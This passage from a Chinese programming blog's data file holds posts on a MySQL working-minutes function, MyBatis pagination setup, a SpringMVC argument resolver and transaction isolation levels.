class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询时间段内的工作时间函数(剔除周末与非工作时间)</span><br><span class=\"line\"># 参数解释</span><br><span class=\"line\"># _st: 开始时间</span><br><span class=\"line\"># _ed: 结束时间</span><br><span class=\"line\"># _hour1: 工作时间开始小时</span><br><span class=\"line\"># _hour2: 工作时间结束小时</span><br><span class=\"line\"># _minute1: 工作时间开始分钟</span><br><span class=\"line\"># _minute2: 工作时间结束分钟</span><br><span class=\"line\"># 返回工作时间总分钟数</span><br><span class=\"line\"></span><br><span class=\"line\">DELIMITER $$</span><br><span class=\"line\">CREATE FUNCTION work_minute_sum(_st DATETIME, _ed DATETIME, _hour1 INT, _hour2 INT, _minute1 INT, _minute2 INT) RETURNS INTEGER</span><br><span class=\"line\">BEGIN</span><br><span class=\"line\">    DECLARE _one_week_minute INT DEFAULT 10080;</span><br><span class=\"line\">    DECLARE _one_day_work_minute INT DEFAULT (_hour2 - _hour1) * 60 - _minute1 + _minute2;</span><br><span class=\"line\">    DECLARE _st_hour INT DEFAULT DATE_FORMAT(_st, &apos;%H&apos;);</span><br><span class=\"line\">    DECLARE _ed_hour INT DEFAULT DATE_FORMAT(_ed, &apos;%H&apos;);</span><br><span class=\"line\">    DECLARE _st_minute INT DEFAULT DATE_FORMAT(_st, &apos;%i&apos;);</span><br><span class=\"line\">    DECLARE _ed_minute INT DEFAULT DATE_FORMAT(_ed, &apos;%i&apos;);</span><br><span class=\"line\">    DECLARE _st_week INT DEFAULT DATE_FORMAT(_st, &apos;%w&apos;);</span><br><span class=\"line\">    DECLARE _ed_week INT DEFAULT DATE_FORMAT(_ed, &apos;%w&apos;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    DECLARE _diffminute INT;</span><br><span class=\"line\">    DECLARE _che DATETIME;</span><br><span class=\"line\">    DECLARE _flag INT DEFAULT 1;</span><br><span class=\"line\">    DECLARE _week INT;</span><br><span class=\"line\">    DECLARE _hour_div INT;</span><br><span class=\"line\">    DECLARE _count_week INT DEFAULT 0;</span><br><span class=\"line\">    DECLARE _work_minute INT DEFAULT 0;</span><br><span class=\"line\">    </span><br><span class=\"line\">    IF ((_hour1 &gt; _hour2) || (_hour1 = _hour2 &amp;&amp; _minute1 &gt;= _minute2)) THEN</span><br><span class=\"line\">        RETURN 0;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">    IF _st &gt; _ed THEN </span><br><span class=\"line\">        SET _che = _st;</span><br><span class=\"line\">        SET _st = _ed;</span><br><span class=\"line\">        SET _ed = _che;</span><br><span class=\"line\">        SET _flag = -1;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\"></span><br><span class=\"line\">    SET _diffminute = TIMESTAMPDIFF(MINUTE, _st, _ed);</span><br><span class=\"line\">    SET _count_week = _diffminute / _one_week_minute;</span><br><span class=\"line\">    SET _work_minute = _count_week * 5 * _one_day_work_minute;</span><br><span class=\"line\">    </span><br><span class=\"line\">    SET _st = DATE_ADD(_st, INTERVAL (_count_week * 7) DAY);</span><br><span class=\"line\"></span><br><span class=\"line\">    IF (_st_week = 0 || _st_week = 6) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute;</span><br><span class=\"line\">    ELSEIF ((_st_hour &gt; _hour2) || (_st_hour = _hour2 &amp;&amp; _st_minute &gt;= _minute2)) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute - _one_day_work_minute;</span><br><span class=\"line\">\tELSEIF (_st_hour &gt; _hour1) || (_st_hour = _hour1 &amp;&amp; _st_minute &gt; _minute1) THEN</span><br><span class=\"line\">        SET _hour_div = _st_hour - _hour1;</span><br><span class=\"line\">        SET _work_minute = _work_minute - (_hour_div * 60) - _st_minute + _minute1;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">    </span><br><span class=\"line\">    IF _ed_week = 0 || _ed_week = 6 || _ed_hour &lt; _st_hour || (_ed_hour = _st_hour &amp;&amp; _ed_minute &lt;= _st_minute) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute;</span><br><span class=\"line\">    ELSEIF (_ed_hour &lt; _hour1) || (_ed_hour = _hour1 &amp;&amp; _ed_minute &lt; _minute1) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute - _one_day_work_minute;</span><br><span class=\"line\">    ELSEIF (_ed_hour &lt; _hour2) || (_ed_hour = _hour2 &amp;&amp; _ed_minute &lt; _minute2) THEN</span><br><span class=\"line\">\t\tSET _hour_div = _hour2 - _ed_hour;</span><br><span class=\"line\">        SET _work_minute = _work_minute - (_hour_div * 60) + _ed_minute - _minute2;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">    </span><br><span class=\"line\">    loop_cal:LOOP</span><br><span class=\"line\">        SET _week = DATE_FORMAT(_st, &apos;%w&apos;);</span><br><span class=\"line\">        IF _st &gt;= _ed THEN</span><br><span class=\"line\">            LEAVE loop_cal;</span><br><span class=\"line\">        END IF;</span><br><span class=\"line\">        IF _week != 0 &amp;&amp; _week != 6 THEN</span><br><span class=\"line\">\t\t    SET _work_minute = _work_minute + _one_day_work_minute;</span><br><span class=\"line\">        END IF;</span><br><span class=\"line\">        SET _st = DATE_ADD(_st, INTERVAL 1 DAY);</span><br><span class=\"line\">    END LOOP;</span><br><span class=\"line\">    </span><br><span class=\"line\">    RETURN _work_minute * _flag;</span><br><span class=\"line\">END $$</span><br><span class=\"line\">DELIMITER ;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"调用方法\"><a href=\"#调用方法\" class=\"headerlink\" title=\"调用方法\"></a>调用方法</h2><p>#例：某公司工作时间为上午： 09:00 ~ 12:00，下午： 13:30 ~ 18:00，则在2019年3月3日0点到2019年3月13日22点的总工作时间是：<br>select work_minute_sum(‘2019-03-03 00:00:00’, ‘2019-03-13 22:00:00’, 9, 12, 0, 0) + work_minute_sum(‘2019-03-03 00:00:00’, ‘2019-03-13 22:00:00’, 13, 18, 30, 0);</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"SQL方法创建\"><a href=\"#SQL方法创建\" class=\"headerlink\" title=\"SQL方法创建\"></a>SQL方法创建</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询时间段内的工作时间函数(剔除周末与非工作时间)</span><br><span class=\"line\"># 参数解释</span><br><span class=\"line\"># _st: 开始时间</span><br><span class=\"line\"># _ed: 结束时间</span><br><span class=\"line\"># _hour1: 工作时间开始小时</span><br><span class=\"line\"># _hour2: 工作时间结束小时</span><br><span class=\"line\"># _minute1: 工作时间开始分钟</span><br><span class=\"line\"># _minute2: 工作时间结束分钟</span><br><span class=\"line\"># 返回工作时间总分钟数</span><br><span class=\"line\"></span><br><span class=\"line\">DELIMITER $$</span><br><span class=\"line\">CREATE FUNCTION work_minute_sum(_st DATETIME, _ed DATETIME, _hour1 INT, _hour2 INT, _minute1 INT, _minute2 INT) RETURNS INTEGER</span><br><span class=\"line\">BEGIN</span><br><span class=\"line\">    DECLARE _one_week_minute INT DEFAULT 10080;</span><br><span class=\"line\">    DECLARE _one_day_work_minute INT DEFAULT (_hour2 - _hour1) * 60 - _minute1 + _minute2;</span><br><span class=\"line\">    DECLARE _st_hour INT DEFAULT DATE_FORMAT(_st, &apos;%H&apos;);</span><br><span class=\"line\">    DECLARE _ed_hour INT DEFAULT DATE_FORMAT(_ed, &apos;%H&apos;);</span><br><span class=\"line\">    DECLARE _st_minute INT DEFAULT DATE_FORMAT(_st, &apos;%i&apos;);</span><br><span class=\"line\">    DECLARE _ed_minute INT DEFAULT DATE_FORMAT(_ed, &apos;%i&apos;);</span><br><span class=\"line\">    DECLARE _st_week INT DEFAULT DATE_FORMAT(_st, &apos;%w&apos;);</span><br><span class=\"line\">    DECLARE _ed_week INT DEFAULT DATE_FORMAT(_ed, &apos;%w&apos;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    DECLARE _diffminute INT;</span><br><span class=\"line\">    DECLARE _che DATETIME;</span><br><span class=\"line\">    DECLARE _flag INT DEFAULT 1;</span><br><span class=\"line\">    DECLARE _week INT;</span><br><span class=\"line\">    DECLARE _hour_div INT;</span><br><span class=\"line\">    DECLARE _count_week INT DEFAULT 0;</span><br><span class=\"line\">    DECLARE _work_minute INT DEFAULT 0;</span><br><span class=\"line\">    </span><br><span class=\"line\">    IF ((_hour1 &gt; _hour2) || (_hour1 = _hour2 &amp;&amp; _minute1 &gt;= _minute2)) THEN</span><br><span class=\"line\">        RETURN 0;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">    IF _st &gt; _ed THEN </span><br><span class=\"line\">        SET _che = _st;</span><br><span class=\"line\">        SET _st = _ed;</span><br><span class=\"line\">        SET _ed = _che;</span><br><span class=\"line\">        SET _flag = -1;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\"></span><br><span class=\"line\">    SET _diffminute = TIMESTAMPDIFF(MINUTE, _st, _ed);</span><br><span class=\"line\">    SET _count_week = _diffminute / _one_week_minute;</span><br><span class=\"line\">    SET _work_minute = _count_week * 5 * _one_day_work_minute;</span><br><span class=\"line\">    </span><br><span class=\"line\">    SET _st = DATE_ADD(_st, INTERVAL (_count_week * 7) DAY);</span><br><span class=\"line\"></span><br><span class=\"line\">    IF (_st_week = 0 || _st_week = 6) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute;</span><br><span class=\"line\">    ELSEIF ((_st_hour &gt; _hour2) || (_st_hour = _hour2 &amp;&amp; _st_minute &gt;= _minute2)) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute - _one_day_work_minute;</span><br><span class=\"line\">\tELSEIF (_st_hour &gt; _hour1) || (_st_hour = _hour1 &amp;&amp; _st_minute &gt; _minute1) THEN</span><br><span class=\"line\">        SET _hour_div = _st_hour - _hour1;</span><br><span class=\"line\">        SET _work_minute = _work_minute - (_hour_div * 60) - _st_minute + _minute1;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">    </span><br><span class=\"line\">    IF _ed_week = 0 || _ed_week = 6 || _ed_hour &lt; _st_hour || (_ed_hour = _st_hour &amp;&amp; _ed_minute &lt;= _st_minute) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute;</span><br><span class=\"line\">    ELSEIF (_ed_hour &lt; _hour1) || (_ed_hour = _hour1 &amp;&amp; _ed_minute &lt; _minute1) THEN</span><br><span class=\"line\">        SET _work_minute = _work_minute - _one_day_work_minute;</span><br><span class=\"line\">    ELSEIF (_ed_hour &lt; _hour2) || (_ed_hour = _hour2 &amp;&amp; _ed_minute &lt; _minute2) THEN</span><br><span class=\"line\">\t\tSET _hour_div = _hour2 - _ed_hour;</span><br><span class=\"line\">        SET _work_minute = _work_minute - (_hour_div * 60) + _ed_minute - _minute2;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\">    </span><br><span class=\"line\">    loop_cal:LOOP</span><br><span class=\"line\">        SET _week = DATE_FORMAT(_st, &apos;%w&apos;);</span><br><span class=\"line\">        IF _st &gt;= _ed THEN</span><br><span class=\"line\">            LEAVE loop_cal;</span><br><span class=\"line\">        END IF;</span><br><span class=\"line\">        IF _week != 0 &amp;&amp; _week != 6 THEN</span><br><span class=\"line\">\t\t    SET _work_minute = _work_minute + _one_day_work_minute;</span><br><span class=\"line\">        END IF;</span><br><span class=\"line\">        SET _st = DATE_ADD(_st, INTERVAL 1 DAY);</span><br><span class=\"line\">    END LOOP;</span><br><span class=\"line\">    </span><br><span class=\"line\">    RETURN _work_minute * _flag;</span><br><span class=\"line\">END $$</span><br><span class=\"line\">DELIMITER ;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"调用方法\"><a href=\"#调用方法\" class=\"headerlink\" title=\"调用方法\"></a>调用方法</h2><p>#例：某公司工作时间为上午： 09:00 ~ 12:00，下午： 13:30 ~ 18:00，则在2019年3月3日0点到2019年3月13日22点的总工作时间是：<br>select work_minute_sum(‘2019-03-03 00:00:00’, ‘2019-03-13 22:00:00’, 9, 12, 0, 0) + work_minute_sum(‘2019-03-03 00:00:00’, ‘2019-03-13 22:00:00’, 13, 18, 30, 0);</p>\n"},{"title":"MyBatis分页配置","date":"2018-03-24T01:47:31.000Z","keywords":"mybatis, 分页","rId":"MB-18032401","_content":"\n### 依赖\n\n```\n<dependency>\n    <groupId>com.github.pagehelper</groupId>\n    <artifactId>pagehelper</artifactId>\n    <version>4.1.3</version>\n</dependency>\n```\n\n### 配置\n\n```\n<bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n        <property name=\"dataSource\" ref=\"dataSource\"/>\n        <property name=\"typeAliasesPackage\" value=\"com.xxx.xxx.vo\"/>\n        <property name=\"plugins\">\n            <array>\n                <bean class=\"com.github.pagehelper.PageHelper\">\n                    <property name=\"properties\">\n                        <value>\n                            dialect=mysql\n                            offsetAsPageNum=true\n                            rowBoundsWithCount=true\n                        </value>\n                    </property>\n                </bean>\n            </array>\n        </property>\n    </bean>\n```\n\n### 使用\n\n```\nPageHelper.startPage(pageNum, pageSize); // pageNum 下标从1开始\nPage<Data> page = dao.searchList(form); // sql中不写limit\n\n```\n\n","source":"_posts/2018-03-24_mybatis_pager.md","raw":"---\ntitle: MyBatis分页配置\ndate: 2018-03-24 09:47:31\ntags: MyBatis\npermalink: mybatis-pager\nkeywords: mybatis, 分页\nrId: MB-18032401\n---\n\n### 依赖\n\n```\n<dependency>\n    <groupId>com.github.pagehelper</groupId>\n    <artifactId>pagehelper</artifactId>\n    <version>4.1.3</version>\n</dependency>\n```\n\n### 配置\n\n```\n<bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n        <property name=\"dataSource\" ref=\"dataSource\"/>\n        <property name=\"typeAliasesPackage\" value=\"com.xxx.xxx.vo\"/>\n        <property name=\"plugins\">\n            <array>\n                <bean class=\"com.github.pagehelper.PageHelper\">\n                    <property name=\"properties\">\n                        <value>\n                            dialect=mysql\n                            offsetAsPageNum=true\n                            rowBoundsWithCount=true\n                        </value>\n                    </property>\n                </bean>\n            </array>\n        </property>\n    </bean>\n```\n\n### 使用\n\n```\nPageHelper.startPage(pageNum, pageSize); // pageNum 下标从1开始\nPage<Data> page = dao.searchList(form); // sql中不写limit\n\n```\n\n","slug":"mybatis-pager","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05m000ig0ukzdw5av76","content":"<h3 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;4.1.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;</span><br><span class=\"line\">        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;</span><br><span class=\"line\">        &lt;property name=&quot;typeAliasesPackage&quot; value=&quot;com.xxx.xxx.vo&quot;/&gt;</span><br><span class=\"line\">        &lt;property name=&quot;plugins&quot;&gt;</span><br><span class=\"line\">            &lt;array&gt;</span><br><span class=\"line\">                &lt;bean class=&quot;com.github.pagehelper.PageHelper&quot;&gt;</span><br><span class=\"line\">                    &lt;property name=&quot;properties&quot;&gt;</span><br><span class=\"line\">                        &lt;value&gt;</span><br><span class=\"line\">                            dialect=mysql</span><br><span class=\"line\">                            offsetAsPageNum=true</span><br><span class=\"line\">                            rowBoundsWithCount=true</span><br><span class=\"line\">                        &lt;/value&gt;</span><br><span class=\"line\">                    &lt;/property&gt;</span><br><span class=\"line\">                &lt;/bean&gt;</span><br><span class=\"line\">            &lt;/array&gt;</span><br><span class=\"line\">        &lt;/property&gt;</span><br><span class=\"line\">    &lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PageHelper.startPage(pageNum, pageSize); // pageNum 下标从1开始</span><br><span class=\"line\">Page&lt;Data&gt; page = dao.searchList(form); // sql中不写limit</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;4.1.3&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;</span><br><span class=\"line\">        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;</span><br><span class=\"line\">        &lt;property name=&quot;typeAliasesPackage&quot; value=&quot;com.xxx.xxx.vo&quot;/&gt;</span><br><span class=\"line\">        &lt;property name=&quot;plugins&quot;&gt;</span><br><span class=\"line\">            &lt;array&gt;</span><br><span class=\"line\">                &lt;bean class=&quot;com.github.pagehelper.PageHelper&quot;&gt;</span><br><span class=\"line\">                    &lt;property name=&quot;properties&quot;&gt;</span><br><span class=\"line\">                        &lt;value&gt;</span><br><span class=\"line\">                            dialect=mysql</span><br><span class=\"line\">                            offsetAsPageNum=true</span><br><span class=\"line\">                            rowBoundsWithCount=true</span><br><span class=\"line\">                        &lt;/value&gt;</span><br><span class=\"line\">                    &lt;/property&gt;</span><br><span class=\"line\">                &lt;/bean&gt;</span><br><span class=\"line\">            &lt;/array&gt;</span><br><span class=\"line\">        &lt;/property&gt;</span><br><span class=\"line\">    &lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PageHelper.startPage(pageNum, pageSize); // pageNum 下标从1开始</span><br><span class=\"line\">Page&lt;Data&gt; page = dao.searchList(form); // sql中不写limit</span><br></pre></td></tr></table></figure>\n\n"},{"title":"SpringMVC自定义配置自动注入对象","date":"2018-02-25T07:20:10.000Z","keywords":"spring, 注入对象, 自定义","rId":"MB-18022501","_content":"\n1. 继承org.springframework.web.method.support.HandlerMethodArgumentResolver的类test.UserArgumentResolver\n2. 配置文件配置参数\n\n```\n<mvc:annotation-driven>\n    <mvc:argument-resolvers>\n    \t<bean class=\"com.xxx.UserArgumentResolver\"/>\n    </mvc:argument-resolvers>\n</mvc:annotation-driven>\n```\n\n","source":"_posts/2018-02-25_spring_autowire_resolver.md","raw":"---\ntitle: SpringMVC自定义配置自动注入对象\ndate: 2018-02-25 15:20:10\ntags: spring\npermalink: spring-autowire-resolver\nkeywords: spring, 注入对象, 自定义\nrId: MB-18022501\n---\n\n1. 继承org.springframework.web.method.support.HandlerMethodArgumentResolver的类test.UserArgumentResolver\n2. 配置文件配置参数\n\n```\n<mvc:annotation-driven>\n    <mvc:argument-resolvers>\n    \t<bean class=\"com.xxx.UserArgumentResolver\"/>\n    </mvc:argument-resolvers>\n</mvc:annotation-driven>\n```\n\n","slug":"spring-autowire-resolver","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05n000jg0ukkviu78r0","content":"<ol>\n<li>继承org.springframework.web.method.support.HandlerMethodArgumentResolver的类test.UserArgumentResolver</li>\n<li>配置文件配置参数</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;mvc:annotation-driven&gt;</span><br><span class=\"line\">    &lt;mvc:argument-resolvers&gt;</span><br><span class=\"line\">    \t&lt;bean class=&quot;com.xxx.UserArgumentResolver&quot;/&gt;</span><br><span class=\"line\">    &lt;/mvc:argument-resolvers&gt;</span><br><span class=\"line\">&lt;/mvc:annotation-driven&gt;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li>继承org.springframework.web.method.support.HandlerMethodArgumentResolver的类test.UserArgumentResolver</li>\n<li>配置文件配置参数</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;mvc:annotation-driven&gt;</span><br><span class=\"line\">    &lt;mvc:argument-resolvers&gt;</span><br><span class=\"line\">    \t&lt;bean class=&quot;com.xxx.UserArgumentResolver&quot;/&gt;</span><br><span class=\"line\">    &lt;/mvc:argument-resolvers&gt;</span><br><span class=\"line\">&lt;/mvc:annotation-driven&gt;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"事务的隔离级别","date":"2018-03-10T04:13:59.000Z","keywords":"事务, 隔离级别","rId":"MB-18031001","_content":"\n## 事务的ACID特性\n\n1. 原子性 \n2. 一致性（事务处理前后从一个一致性状态变换到另一个一致性状态） \n3. 隔离性（多个并发事务间的隔离） \n4. 持久性 \n\n## 无隔离处理下的几种问题\n\n### 1. 脏读\n\n并发的其中一个事务读取另一个事务未提交的内容，当另一个事务回滚后发现读的是无效数据 \n\n### 2. 不可重复读\n\n并发的其中一个事务在一开始读取了一次数据，并在另一个事务提交后又读取了一次数据，发现两次读取的数据不一致 \n\n### 3. 幻读（虚读）\n\n并发的其中一条事务对表内的所有行执行字段a的值从1变为2，这时在另一条事务中在表内添加了另一条a的值为1的数据，前一条事务会发现执行完后，表内仍有a字段值为1的记录 \n\n\n\n## 事务隔离级别\n\n针对上述问题，设置了四种事务的隔离级别，由用户根据业务选择使用哪种隔离级别 ，在MySQL中默认是Repeatable Read级别，Oracle中默认是Read Committed级别。\n\n### 1. 读未提交(READ UNCOMMITTED)\n\n可以读到其他事务未提交的数据。 \n\n### 2. 读已提交(READ COMMITTED)\n\n只能读到其他事务已提交的数据。 \n\n### 3. 可重复读(REPEATABLE READ)\n\n在读已提交的基础上，增加一点，本条事务内，读同一份数据，以该事务第一次读取的数据的备份为标准（即使在此期间其他事务提交了该数据的修改，读到的仍是原数据）。 \n\n### 4. 串行(SERIALIZABLE)\n\n串行执行，该事务不能与其他事务同时操作同一个数据，必须等待操作数据的事务或串行事务提交才能继续运行。Serializable的事务先查询或修改了该条记录，则其他事务对该记录的操作均会被阻塞。 \n\n\n事务隔离会在写数据的时候给数据加上排他锁，而串行事务下读数据的时候也会给数据加上排他锁。 \n\n\n\n## 其他\n\n查看当前事务隔离级别  `SELECT @@TX_ISOLATION`\n\n设置当前事务隔离级别  `SET SESSION TRANSACTION ISOLATION LEVEL read uncommitted / read committed / repeatable read / serializable`\n\nSpring中注解设置 `@Transactional(isolation = Isolation.REPEATABLE_READ)`","source":"_posts/2018-03-10_transaction_isolation.md","raw":"---\ntitle: 事务的隔离级别\ndate: 2018-03-10 12:13:59\ntags: mysql\npermalink: transaction-isolation\nkeywords: 事务, 隔离级别\nrId: MB-18031001\n---\n\n## 事务的ACID特性\n\n1. 原子性 \n2. 一致性（事务处理前后从一个一致性状态变换到另一个一致性状态） \n3. 隔离性（多个并发事务间的隔离） \n4. 持久性 \n\n## 无隔离处理下的几种问题\n\n### 1. 脏读\n\n并发的其中一个事务读取另一个事务未提交的内容，当另一个事务回滚后发现读的是无效数据 \n\n### 2. 不可重复读\n\n并发的其中一个事务在一开始读取了一次数据，并在另一个事务提交后又读取了一次数据，发现两次读取的数据不一致 \n\n### 3. 幻读（虚读）\n\n并发的其中一条事务对表内的所有行执行字段a的值从1变为2，这时在另一条事务中在表内添加了另一条a的值为1的数据，前一条事务会发现执行完后，表内仍有a字段值为1的记录 \n\n\n\n## 事务隔离级别\n\n针对上述问题，设置了四种事务的隔离级别，由用户根据业务选择使用哪种隔离级别 ，在MySQL中默认是Repeatable Read级别，Oracle中默认是Read Committed级别。\n\n### 1. 读未提交(READ UNCOMMITTED)\n\n可以读到其他事务未提交的数据。 \n\n### 2. 